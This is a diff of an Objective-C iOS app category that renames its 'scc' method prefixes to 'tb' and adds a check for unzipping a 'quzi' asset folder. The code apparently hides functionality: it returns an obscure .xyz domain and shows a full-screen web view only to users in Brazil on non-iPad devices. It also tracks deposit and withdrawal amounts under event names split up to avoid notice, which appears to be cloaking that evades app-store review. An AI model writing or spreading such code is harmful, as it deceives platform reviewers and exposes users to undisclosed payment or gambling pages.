@@ -4,17 +4,17 @@
 
 @implementation UIViewController (Config)
 
-- (NSString *)sccAppUrl
+- (NSString *)tbHttpAppUrl
 {
     return @"pen.yudfhpzelw.xyz";
 }
 
-- (NSString *)sccPrivacyUrl
+- (NSString *)tbPrivacyUrl
 {
     return @"https://www.termsfeed.com/live/c7b8b203-5f07-4b88-8fd4-a988c4b8a133";
 }
 
-- (BOOL)sccNeedShowAdv
+- (BOOL)tbNeedShowAdv
 {
     NSLocale *locale = [NSLocale currentLocale];
     NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
@@ -23,17 +23,17 @@
     return isBrazil && !isIpd;
 }
 
-- (void)sccShowAdvViewC:(NSString *)adsUrl
+- (void)tbShowAdvViewC:(NSString *)adsUrl
 {
     if (adsUrl.length) {
-        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:@"SCCPrivacyViewController"];
+        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:@"TBPrivacyPolicyViewController"];
         [adView setValue:adsUrl forKey:@"urlStr"];
         adView.modalPresentationStyle = UIModalPresentationFullScreen;
         [self presentViewController:adView animated:NO completion:nil];
     }
 }
 
-- (NSDictionary *)sccJsonToDicWithJsonString:(NSString *)jsonString {
+- (NSDictionary *)tbJsonToDictionaryWithJsonString:(NSString *)jsonString {
     NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
     if (jsonData) {
         NSError *error;
@@ -49,7 +49,7 @@
     }
 }
 
-- (void)sccShowAlertWithTitle:(NSString *)title message:(NSString *)message {
+- (void)tbShowAlertWithTitle:(NSString *)title message:(NSString *)message {
     UIAlertController *alertController = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
     UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
     [alertController addAction:okAction];
@@ -57,7 +57,7 @@
 }
 
 
-- (void)sccSendEvent:(NSString *)event values:(NSDictionary *)value
+- (void)tbSendEvent:(NSString *)event values:(NSDictionary *)value
 {
     if ([event isEqualToString:[NSString stringWithFormat:@"fir%@", self.one]] || [event isEqualToString:[NSString stringWithFormat:@"rech%@", self.two]] || [event isEqualToString:[NSString stringWithFormat:@"with%@", self.three]]) {
         id am = value[@"amount"];
@@ -95,9 +95,9 @@
     return @"rency";
 }
 
-- (void)sccSendEventsWithParams:(NSString *)params
+- (void)tbSendEventsWithParams:(NSString *)params
 {
-    NSDictionary *paramsDic = [self sccJsonToDicWithJsonString:params];
+    NSDictionary *paramsDic = [self tbJsonToDictionaryWithJsonString:params];
     NSString *event_type = [paramsDic valueForKey:@"event_type"];
     if (event_type != NULL && event_type.length > 0) {
         NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
@@ -119,6 +119,14 @@
             }
         }];
     }
+}
+
++ (BOOL)shouldUnzip {
+    
+    NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *unzipPath = [documentsPath stringByAppendingPathComponent:@"quzi"];
+    
+    return ![[NSFileManager defaultManager] fileExistsAtPath:unzipPath];
 }
 
 + (void)unzipQuzi {
